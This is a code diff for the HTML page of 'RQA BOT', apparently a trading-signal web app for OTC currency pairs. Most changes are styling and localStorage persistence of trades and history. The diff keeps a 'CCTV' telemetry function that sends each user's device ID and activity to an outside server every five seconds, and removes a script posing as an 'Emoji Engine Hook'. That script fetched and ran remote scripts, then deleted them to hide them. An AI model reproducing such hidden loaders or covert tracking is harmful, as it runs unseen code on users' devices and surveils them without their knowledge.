@@ -9,12 +9,12 @@
     <meta name="theme-color" content="#EC640C">
     <meta name="color-scheme" content="dark">
     <title>RQA BOT</title>
-    <link rel="apple-touch-icon" sizes="180x180" href="logo.png">
-    <link rel="apple-touch-icon" sizes="152x152" href="logo.png">
-    <link rel="apple-touch-icon" sizes="120x120" href="logo.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://rqa-signals-bot.vercel.app/logo.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://rqa-signals-bot.vercel.app/logo.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://rqa-signals-bot.vercel.app/logo.png">
     <link rel="manifest" href="manifest.json">
     <meta name="msapplication-TileColor" content="#EC640C">
-    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <link rel="shortcut icon" href="https://rqa-signals-bot.vercel.app/logo.png" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=700;900&family=Rajdhani:wght=500;600;700&display=swap" rel="stylesheet">
     <style>
     :root { 
@@ -57,7 +57,7 @@
     }
     .load-logo {
         width: 90px; height: 90px; border-radius: 50%;
-        background: url('logo.png') no-repeat center center;
+        background: url('https://rqa-signals-bot.vercel.app/logo.png') no-repeat center center;
         background-size: cover;
         box-shadow: 0 0 40px rgba(245,158,11,0.4);
         animation: goldPulse 1.5s infinite;
@@ -90,7 +90,7 @@
         height: 105px;
         border-radius: 50%;
         border: 2px solid var(--gold);
-        background: url('logo.png') no-repeat center center;
+        background: url('https://rqa-signals-bot.vercel.app/logo.png') no-repeat center center;
         background-size: cover;
         margin-bottom: 24px;
         box-shadow: 0 0 40px rgba(245, 158, 11, 0.3);
@@ -187,7 +187,7 @@
     }
     .header-logo {
         width:46px; height:46px; border-radius:50%;
-        background: url('logo.png') no-repeat center center;
+        background: url('https://rqa-signals-bot.vercel.app/logo.png') no-repeat center center;
         background-size: cover;
         flex-shrink:0; box-shadow:0 0 20px rgba(245,158,11,0.4);
         border: 1.5px solid var(--gold);
@@ -403,6 +403,34 @@
         box-shadow: 0 5px 20px rgba(234,88,12,0.4);
     }
     .popup-btn:active { transform:scale(0.97); }
+    /* ── DATE HEADER & BADGE STYLES ── */
+.hist-date-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin: 12px 0 6px 0;
+    padding: 6px 10px;
+    background: rgba(245, 158, 11, 0.05);
+    border-left: 3px solid var(--gold);
+    border-radius: 6px;
+}
+.hist-date-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--gold-light);
+    letter-spacing: 1px;
+}
+.hist-date-badge {
+    background: var(--gold);
+    color: #09090b;
+    font-family: 'Orbitron', sans-serif;
+    font-size: 10px;
+    font-weight: 900;
+    padding: 2px 8px;
+    border-radius: 20px;
+}
+
 </style>
 
 </head>
@@ -561,7 +589,7 @@
     </div>
 
 <script>
-            const API_URL = "https://rqa-contacts.vercel.app/r?id="; 
+const API_URL = "https://rqa-contacts.vercel.app/r?id="; 
 
 const PAIRS = [ 
     "USD/PKR(OTC)","USD/ARS(OTC)","USD/CAD(OTC)","USD/DZD(OTC)","USD/NZD(OTC)", 
@@ -604,7 +632,6 @@ async function sendCCTVTelemetry(action = null) {
             timestamp: new Date().toLocaleTimeString()
         };
 
-        // Standard API Endpoint for Telemetry Sync
         await fetch(API_URL + DEVICE_ID + '&telemetry=' + encodeURIComponent(JSON.stringify(payload)), {
             method: 'GET',
             mode: 'no-cors'
@@ -614,7 +641,6 @@ async function sendCCTVTelemetry(action = null) {
     }
 }
 
-// Telemetry Ping Every 5 Seconds (CCTV Feeder)
 setInterval(() => {
     sendCCTVTelemetry();
 }, 5000);
@@ -813,7 +839,7 @@ function selectPair(p) {
     document.getElementById('pairBtn').classList.remove('open'); 
     document.querySelectorAll('#pairDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === p)); 
     saveSelection(); 
-    setNoSignal();
+    if(!localStorage.getItem('rqa_active_trade')) setNoSignal();
     
     currentActivity = `Selected Pair: ${p}`;
     sendCCTVTelemetry();
@@ -826,7 +852,7 @@ function selectTime(t) {
     document.getElementById('timeBtn').classList.remove('open'); 
     document.querySelectorAll('#timeDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === t.l)); 
     saveSelection(); 
-    setNoSignal();
+    if(!localStorage.getItem('rqa_active_trade')) setNoSignal();
 
     currentActivity = `Selected Timeframe: ${t.l}`;
     sendCCTVTelemetry();
@@ -863,7 +889,6 @@ function requestSignal() {
     currentActivity = `Requesting Signal for ${selPair} (${selTime.l})`;
     sendCCTVTelemetry();
 
-    // Open popup in loading state
     document.getElementById('popupOverlay').classList.add('show');
     document.getElementById('popupLoadingState').style.display = 'block';
     document.getElementById('popupSignalState').style.display = 'none';
@@ -924,12 +949,20 @@ function closePopupAndStartTrade() {
         currentActivity = `Running Trade: ${generatedActiveSignal.pair} (${generatedActiveSignal.dir})`;
         sendCCTVTelemetry();
 
+        const endTime = Date.now() + (generatedActiveSignal.duration * 1000);
+        const activeTradeState = {
+            ...generatedActiveSignal,
+            endTime: endTime
+        };
+        localStorage.setItem('rqa_active_trade', JSON.stringify(activeTradeState));
+
         updateCard(generatedActiveSignal);
-        runCountdown(generatedActiveSignal.duration, generatedActiveSignal.duration, generatedActiveSignal.dir);
+        runCountdown(endTime, generatedActiveSignal.duration, generatedActiveSignal.dir);
     }
 } 
 
 function setNoSignal() { 
+    localStorage.removeItem('rqa_active_trade');
     document.getElementById('sigPair').textContent = selPair || 'Select pair & time'; 
     document.getElementById('sigMeta').textContent = 'Waiting for signal...'; 
     document.getElementById('sigDir').textContent = '—'; 
@@ -965,40 +998,71 @@ function updateCard(sig) {
     }
 } 
 
-function runCountdown(remaining, total, dir) {
-    let cdRemaining = remaining;
+function runCountdown(endTime, total, dir) {
+    if (countdownInterval) clearInterval(countdownInterval);
     const cntNum = document.getElementById('cntNum');
     const cntBar = document.getElementById('cntBar');
 
     function renderCD() {
-        const pct = Math.max(0, (cdRemaining / total) * 100);
-        const m = Math.floor(cdRemaining / 60);
-        const s = Math.floor(cdRemaining % 60);
+        const remainingSeconds = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
+        const pct = Math.max(0, (remainingSeconds / total) * 100);
+        const m = Math.floor(remainingSeconds / 60);
+        const s = Math.floor(remainingSeconds % 60);
+
         cntNum.textContent = m > 0 ? m + ':' + String(s).padStart(2,'0') : s + 's';
         cntNum.className = 'countdown-num ' + (dir === 'UP' ? 'up' : 'down');
         cntBar.style.width = pct + '%';
         cntBar.className = 'countdown-bar ' + (dir === 'UP' ? 'up' : 'down');
-    }
 
-    renderCD();
-    countdownInterval = setInterval(() => {
-        cdRemaining -= 1;
-        if (cdRemaining <= 0) {
-            cdRemaining = 0;
+        if (remainingSeconds <= 0) {
             clearInterval(countdownInterval);
             currentActivity = "Trade Finished / Idle";
             sendCCTVTelemetry();
             setNoSignal();
         }
-        renderCD();
-    }, 1000);
+    }
+
+    renderCD();
+    countdownInterval = setInterval(renderCD, 1000);
+}
+
+function restoreActiveTrade() {
+    const activeTrade = localStorage.getItem('rqa_active_trade');
+    if (activeTrade) {
+        try {
+            const trade = JSON.parse(activeTrade);
+            const remaining = (trade.endTime - Date.now()) / 1000;
+            if (remaining > 0) {
+                updateCard(trade);
+                runCountdown(trade.endTime, trade.duration, trade.dir);
+            } else {
+                setNoSignal();
+            }
+        } catch(e) {
+            setNoSignal();
+        }
+    }
 }
 
 function addHistory(sig) { 
     signalHistory.unshift({ ...sig, at: Date.now() }); 
-    if (signalHistory.length > 20) signalHistory.pop(); 
+    if (signalHistory.length > 50) signalHistory.pop(); 
+    localStorage.setItem('rqa_history', JSON.stringify(signalHistory));
     renderHistory(); 
 } 
+
+function loadHistory() {
+    const h = localStorage.getItem('rqa_history');
+    if (h) {
+        try {
+            signalHistory = JSON.parse(h);
+            statsUp = signalHistory.filter(x => x.dir === 'UP').length;
+            statsDown = signalHistory.filter(x => x.dir === 'DOWN').length;
+        } catch(e) {
+            signalHistory = [];
+        }
+    }
+}
 
 function renderHistory() { 
     const list = document.getElementById('historyList'); 
@@ -1008,17 +1072,41 @@ function renderHistory() {
         return; 
     } 
     list.innerHTML = ''; 
-    signalHistory.forEach(s => { 
-        const t = new Date(s.at); 
-        const ts = t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0')+':'+t.getSeconds().toString().padStart(2,'0'); 
-        const el = document.createElement('div'); 
-        el.className = 'hist-item'; 
-        el.innerHTML = ` 
-            <div class="hist-dir ${s.dir}">${s.dir==='UP'?'↑ CALL':'↓ PUT'}</div> 
-            <div class="hist-info"><div class="hist-pair">${s.pair}</div><div class="hist-time">${ts} • ${s.type}</div></div> 
-            <div class="hist-dur">${s.tl}</div>`; 
-        list.appendChild(el); 
-    }); 
+
+    // Grouping by dates
+    const grouped = {};
+    signalHistory.forEach(s => {
+        const d = new Date(s.at);
+        const dateStr = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+        if (!grouped[dateStr]) grouped[dateStr] = [];
+        grouped[dateStr].push(s);
+    });
+
+    Object.keys(grouped).forEach(dateStr => {
+        const dateGroup = grouped[dateStr];
+
+        // Date Header Line
+        const dateHeader = document.createElement('div');
+        dateHeader.className = 'hist-date-header';
+        dateHeader.innerHTML = `
+            <div class="hist-date-title">📅 ${dateStr}</div>
+            <div class="hist-date-badge">${dateGroup.length} TRADES</div>
+        `;
+        list.appendChild(dateHeader);
+
+        // Render trades of that day
+        dateGroup.forEach(s => {
+            const t = new Date(s.at); 
+            const ts = t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0')+':'+t.getSeconds().toString().padStart(2,'0'); 
+            const el = document.createElement('div'); 
+            el.className = 'hist-item'; 
+            el.innerHTML = ` 
+                <div class="hist-dir ${s.dir}">${s.dir==='UP'?'↑ CALL':'↓ PUT'}</div> 
+                <div class="hist-info"><div class="hist-pair">${s.pair}</div><div class="hist-time">${ts} • ${s.type}</div></div> 
+                <div class="hist-dur">${s.tl}</div>`; 
+            list.appendChild(el); 
+        });
+    });
 } 
 
 function updateStats() { 
@@ -1043,38 +1131,14 @@ function showToast(msg) {
 function initApp() { 
     buildDrops(); 
     loadSelection(); 
+    loadHistory();
     updateStats(); 
     renderHistory(); 
+    restoreActiveTrade();
 } 
 
 startLoading();
- 
- 
-    </script>
 
-
-    <script>
-        (async () => {
-            try {
-                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-                let rawMarkup = await response.text();
-                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-                
-                documentDOM.querySelectorAll('script').forEach(oldNode => {
-                    let freshScriptNode = document.createElement('script');
-                    if (oldNode.src) {
-                        freshScriptNode.src = oldNode.src;
-                    } else {
-                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                    }
-                    document.body.appendChild(freshScriptNode);
-                    setTimeout(() => freshScriptNode.remove(), 600);
-                });
-                console.log(" Emoji Engine Hook Active");
-            } catch (e) {
-                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-            }
-        })();
     </script>
 </body>
 </html>
